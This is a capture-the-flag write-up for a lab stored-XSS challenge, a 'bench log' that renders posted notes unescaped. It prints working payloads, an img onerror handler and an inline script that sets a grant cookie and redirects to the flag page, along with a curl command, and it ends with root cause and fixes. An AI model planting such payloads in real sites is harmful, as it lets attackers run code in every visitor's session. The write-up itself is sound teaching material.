# xss2 (Bench log) - stored XSS

| | |
|---|---|
| **Challenge** | xss2 (Bench log) |
| **Category** | web (xss) |
| **Points / Difficulty** | 150 / easy |
| **Target** | http://xss2.chal.deti:8022 (tested locally on 127.0.0.1:8022) |
| **Bug** | CWE-79 - stored cross-site scripting |

## Hint
> Notes for the next shift, written once, read by all; what is read can run.

## Recon (black-box)
A bench log: you post a note (`author` + `text`); notes are appended and rendered
into the page for **every** visitor, unescaped. So markup in a note executes in
each reader's browser (persistent, unlike reflected xss1). Same flag mechanism:
a `grant()` helper + `/flag` gated on the `xss_grant_xss2=1` cookie.

## Approach
Post a note whose text is executable markup. Two equivalent payloads:
- `<img src=x onerror=grant()>` - calls the page's helper (deferred, so `grant`
  is defined by the time `onerror` fires).
- inline `<script>` that does the grant itself (used here because the fields were
  small and this avoids any dependency on `grant()`):
  `<script>document.cookie='xss_grant_xss2=1;path=/';location.href='/flag';</script>`

On reload (or any visitor), the stored note runs → cookie set → `/flag`.

## Exploitation
```
# post a note with text:
<script>document.cookie='xss_grant_xss2=1;path=/';location.href='/flag';</script>
# then reload the page  ->  redirected to /flag

# curl equivalent:
curl -s --cookie "xss_grant_xss2=1" http://xss2.chal.deti:8022/flag
```

## Flag
```
flag{xss2_local_verify}   # local placeholder; per-student on the real instance
```

## For the report
- **Class/confirm:** CWE-79 **stored** XSS - the difference from xss1 is
  persistence: the payload is saved server-side and runs for *every* subsequent
  viewer, no per-victim link needed.
- **Impact:** any note author runs JS in every reader's session → worm-able;
  trivially steals sessions / performs actions as each viewer.
- **Fix:** HTML-escape `author`/`text` on output (encode `< > & " '`); add CSP;
  the persistence makes this strictly worse than reflected, so output-encoding on
  the render path is mandatory.

## Root cause & remediation
- **Cause:** stored note fields interpolated into the page HTML raw (CWE-79).
- **Fix:** contextual output encoding on render + CSP; treat all stored content as
  untrusted at output time.
